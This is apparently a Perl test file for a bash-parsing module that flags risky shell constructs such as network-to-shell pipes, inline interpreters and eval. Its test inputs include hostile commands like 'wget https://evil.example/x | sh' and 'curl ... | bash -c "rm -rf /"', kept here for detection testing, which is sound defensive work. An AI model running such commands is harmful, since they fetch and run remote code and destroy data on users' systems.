use Test2::V0;
use Text::Treesitter::Bash;

my $bash = Text::Treesitter::Bash->new;

sub finding_types {
  my ( $source ) = @_;
  return [ map { $_->{type} } $bash->findings($source) ];
}

# --- Built-in findings coverage -----------------------------------------

is finding_types('wget https://evil.example/x | sh'),
  [ 'shell_interpreter', 'network_to_shell' ],
  'wget|sh also fires network_to_shell';

is finding_types('fetch https://evil.example/x | bash'),
  [ 'shell_interpreter', 'network_to_shell' ],
  'fetch|bash also fires network_to_shell';

is finding_types('perl -e "print 1"'),
  [ 'dynamic_shell' ],
  'perl -e fires dynamic_shell';

is finding_types('ruby -e "puts 1"'),
  [ 'dynamic_shell' ],
  'ruby -e fires dynamic_shell';

is finding_types('node -e "console.log(1)"'),
  [ 'dynamic_shell' ],
  'node -e fires dynamic_shell';

is finding_types('python -c "print(1)"'),
  [ 'dynamic_shell' ],
  'python -c fires dynamic_shell';

is finding_types('python3 -c "print(1)"'),
  [ 'dynamic_shell' ],
  'python3 -c fires dynamic_shell';

is finding_types('zsh -c "id"'),
  [ 'shell_interpreter', 'dynamic_shell' ],
  'zsh -c is both interpreter and dynamic';

is finding_types('eval "echo $USER"'),
  [ 'shell_eval' ],
  'eval fires shell_eval';

is finding_types('source /etc/profile'),
  [ 'shell_eval' ],
  'source fires shell_eval';

is finding_types('. /etc/profile'),
  [ 'shell_eval' ],
  'dot-source fires shell_eval';

# --- Negative cases -----------------------------------------------------

is finding_types('echo safe'),
  [],
  'plain echo has no findings';

is finding_types('git status'),
  [],
  'git status has no findings';

is finding_types('ls /tmp'),
  [],
  'ls /tmp has no findings';

# --- Combination: dangerous chain --------------------------------------

is finding_types('curl https://x.example/y | bash -c "rm -rf /"'),
  [ 'shell_interpreter', 'dynamic_shell', 'network_to_shell' ],
  'curl|bash -c fires three findings';

# --- Pipefail variant `|&` should also trigger network_to_shell ---------

is finding_types('curl https://x.example/y |& bash'),
  [ 'shell_interpreter', 'network_to_shell' ],
  'curl|& bash (pipefail variant) fires network_to_shell';

is finding_types('wget https://evil.example/x |& sh'),
  [ 'shell_interpreter', 'network_to_shell' ],
  'wget|& sh (pipefail variant) fires network_to_shell';

# --- Combination: nested command substitution ---------------------------

is finding_types('echo $(curl https://x.example/y | sh)'),
  [ 'shell_interpreter', 'network_to_shell' ],
  'command substitution wrapping network_to_shell still triggers';

done_testing;
